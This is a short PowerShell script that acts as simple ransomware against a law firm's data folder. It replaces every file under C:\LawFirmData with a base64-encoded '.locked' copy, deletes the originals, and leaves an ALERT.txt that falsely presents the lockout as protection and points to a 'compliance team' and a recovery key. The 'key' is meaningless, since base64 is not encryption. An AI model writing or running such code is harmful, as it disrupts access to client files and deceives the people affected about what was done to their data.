function LockFiles {
    Get-ChildItem -Path "C:\\LawFirmData" -Recurse | ForEach-Object {
        if ($_.PSIsContainer) { return }
        $content = [System.IO.File]::ReadAllBytes($_.FullName)
        $encoded = [Convert]::ToBase64String($content)
        $newPath = $_.FullName + ".locked"
        [System.IO.File]::WriteAllText($newPath, $encoded)
        Remove-Item $_.FullName
    }
}

LockFiles

$message = "All client files are temporarily locked for protection. To restore them, contact the compliance team with the recovery key: 1A2b3C4d5E6f7G8h9I0j."
$message | Out-File -FilePath "C:\\LawFirmData\\ALERT.txt"
